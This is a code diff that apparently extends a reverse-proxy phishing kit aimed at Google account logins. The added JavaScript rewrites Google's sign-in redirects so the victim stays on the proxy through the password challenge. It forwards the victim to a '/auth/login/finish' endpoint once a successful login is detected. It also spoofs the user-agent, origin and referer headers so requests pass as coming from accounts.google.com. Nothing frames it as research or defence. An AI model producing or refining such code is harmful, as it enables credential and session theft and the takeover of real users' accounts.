@@ -54,6 +54,28 @@ const ProxyResponse = class extends globalWorker.BaseClasses.BaseProxyResponseCl
             return this.proxyResp.pipe(this.browserEndPoint)
         }
 
+        // Handle Gmail redirects properly
+        const extRedirectObj = super.getExternalRedirect()
+        if (extRedirectObj !== null) {
+            const rLocation = extRedirectObj.url
+            console.log('Gmail redirect detected:', rLocation)
+            
+            // Handle redirects to password challenge form
+            if (rLocation.includes('/v3/signin/challenge/pwd')) {
+                console.log('Redirecting to password challenge form')
+                this.browserEndPoint.setHeader('location', rLocation.replace('https://accounts.google.com', ''))
+                this.browserEndPoint.statusCode = 302
+                return this.browserEndPoint.end('')
+            }
+            
+            // Handle successful login redirects
+            if (rLocation.startsWith('https://myaccount.google.com/')) {
+                this.browserEndPoint.setHeader('location', '/auth/login/finish')
+                this.browserEndPoint.statusCode = 302
+                return this.browserEndPoint.end('')
+            }
+        }
+
         return super.processResponse(clientContext)
     }
 
@@ -72,6 +94,11 @@ const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
     }
 
     execute(clientContext) {
+        // Set proper headers for Gmail like working services do
+        this.req.headers['user-agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36'
+        this.req.headers['origin'] = this.req.headers['origin'] ? this.req.headers['origin'].replace(clientContext.hostname, 'accounts.google.com') : ''
+        this.req.headers['referer'] = this.req.headers['referer'] ? this.req.headers['referer'].replace(clientContext.hostname, 'accounts.google.com') : ''
+        
         return super.execute(clientContext)
     }
 }
